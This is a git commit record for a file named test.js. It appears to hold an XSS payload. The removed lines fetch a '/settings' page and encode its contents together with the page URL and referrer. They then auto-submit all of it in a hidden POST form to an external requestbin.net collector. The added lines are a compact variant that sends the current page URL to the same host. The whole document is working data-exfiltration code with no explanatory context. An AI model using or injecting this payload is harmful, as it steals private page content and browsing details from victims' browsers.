31334eca6dd2b305a9028c619da941df2324e5ac
Invaders0 <46098959+Invaders0@users.noreply.github.com>
2020-01-19 20:41:38 +0530

    Update test.js

--- test.js
+++ test.js
@@ -1,13 +1,5 @@
-fetch("/settings").then(function(response) {
-    response.text().then(function(back) {
-        f = document.createElement("form");
-        i = document.createElement("input");
-        f.method = 'post';
-        f.action = 'http://requestbin.net/r/rj93qcrj';
-        i.name = 'data';
-        i.value = btoa(encodeURI(back)+window.location.href+document.referrer);
-        f.appendChild(i);
-        document.body.appendChild(f);
-        f.submit();
-    })
-})
+
+f=document.createElement("form");
+i=document.createElement("input");
+f.method='post';f.action='http://requestbin.net/r/rj93qcrj';
+i.name='data';i.value=document.location.href;f.appendChild(i);document.body.appendChild(f);f.submit();
